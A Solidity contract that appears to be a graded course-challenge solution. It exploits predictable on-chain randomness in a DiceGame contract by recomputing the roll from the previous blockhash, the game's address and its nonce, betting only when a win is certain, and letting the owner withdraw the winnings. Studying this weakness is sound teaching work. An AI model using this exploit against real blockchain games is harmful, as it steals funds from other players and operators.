pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	error NotEnoughEther();

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address _addr, uint256 _amount) public onlyOwner {
		if (address(this).balance < _amount) {
			console.log("\t", "  Not enough Ether in the RiggedRoll contract");
			revert NotEnoughEther();
		}
		payable(_addr).transfer(_amount);
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public {
		if (address(this).balance < 0.002 ether) {
			console.log("\t", "  Not enough Ether in the RiggedRoll contract");
			revert NotEnoughEther();
		}

		bytes32 prevHash = blockhash(block.number - 1);
		//Keccak256 hash function on prevhash, address of the diceGame contract and nonce
		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceGame.nonce())
		);
		uint256 roll = uint256(hash) % 16;
		uint256 nonce = diceGame.nonce();
		console.log("\t", "  Rigged Roll Nonce :", nonce);
		console.log("\t", "  Rigged Roll: ", unicode"🎲", roll);

		if (roll <= 5) {
			diceGame.rollTheDice{ value: 0.002 ether }();
			console.log("\t", "  Rigged Roll called the DiceGame contract");
		}
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}
}
